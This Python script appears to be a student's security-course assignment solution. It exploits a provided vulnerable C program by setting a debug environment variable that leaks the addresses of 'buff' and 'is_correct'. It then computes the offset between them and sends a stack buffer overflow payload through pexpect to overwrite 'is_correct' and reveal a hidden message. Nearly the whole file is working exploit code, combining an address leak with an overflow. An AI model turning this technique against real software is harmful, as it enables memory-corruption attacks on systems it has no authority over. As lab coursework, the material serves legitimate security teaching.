
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 6 solution explanation
========================================================================

### how I found the vulnerability
* I analyzed the vulnerable program's source code `task6-vuln.c` and found that I can get 
    sensative information about the addresses of the variables `is_correct` and `buff[20]` by
    creating the environment variable `2+2is5`.
* Then I can overflow the `buff[20]` to change `is_correct` to exit the while-loop.

### how the script works
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I started the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`,
    I created the environment variable `2+2is5` to retrieve the debug information to compute the `buff[20]` offset
    needed to override `is_correct`s value (then removing the environment variable afterwards).
* After computing the buff's offset I will make the `buff[20]` store `\x00` * buff offset, overflowing it and changing
    `is_correct`'s value.
* Once `is_correct` is non-0, the while-loop breaks, and I can then retrieve the hidden message.
"""

import os
import sys
from pexpect import popen_spawn
import pexpect

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"


class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()


def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p


def get_buff_offset(execname):
    '''
    Computes the `buff` offset using the simulated gdb output, once the environment variable
    `2+2is5` exists (it is removed after).
    '''
    os.environ["2+2is5"] = "1"  # make the environment variable exist
        
    # start the vulnerable program
    # since popen() is not using pty, we need to use stdbuf(1)
    # to disable output buffering
    process = color_spawn(f"stdbuf -o0 {execname}", timeout=10)
    
    # Get simulated gdb output of `&buff` and `&is_correct`
    process.expect_exact("DEBUG: (gdb) print/x &buff\n")
    process.expect_exact("DEBUG: (gdb) end\n")
    gdb_out = process.before.decode("ascii").rstrip()
    
    # filter out the addresses
    filter = gdb_out.split("\n")
    buff_adr = filter[0].split(" ")[3]
    is_correct_adr = filter[len(filter) - 1].split(" ")[3]
    
    # compute the `buff` offset
    buff_offset = int(is_correct_adr, 16) - int(buff_adr, 16)
    
    # debug
    # print(f"---gdb out: \n{gdb_out}\n---")
    # print(f"---filter: \n{filter}\n---")
    # print(f"---buff_adr: \n{buff_adr}\n---")
    # print(f"---is_correct_adr: \n{is_correct_adr}\n---")
    # print(f"---buff_offset: \n{buff_offset}\n---")
    
    del os.environ["2+2is5"]    # remove the environment variable
    return buff_offset
    

def main(execname):
    """exploit the vulnerable executable using pexpect"""

    try:      
        # compute the buffer overflow
        buff_offset = get_buff_offset(execname)
        
        # '\x00' is considered `empty` and will be stored in the buffer. After filling up the buffer, we can alter the value of `is_correct`
        overflow = b"\x00" * buff_offset + b"\x39\x12\x32\x44\n"    
        
        # debug
        # print(f"overflow (bytes): `{overflow}`")    
        # print(f"overflow (ascii): `{overflow.decode("ascii")}`")    
        
        # start the vulnerable program
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f"stdbuf -o0 {execname}", timeout=10)
        
        
        # wait for the password prompt
        process.expect_exact("Password:")
        process.sendline(overflow)
                
        # debug
        # process.expect(pexpect.EOF, timeout=10)
        # msg = process.before.decode("ascii").rstrip()
        # print(msg)
        
        # recover the hidden message
        # notice that with popen_spawn we can use \n line endings
        process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
        process.expect_exact("-----END HIDDEN MESSAGE-----")
        hidden_message = process.before.decode("ascii").rstrip()
        # optional: read the remaining output of the program one line at a time until <EOF>
        process.expect(pexpect.EOF, timeout=10)

        # print out the recovered hidden message
        print("Recovered hidden message:", hidden_message)

    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
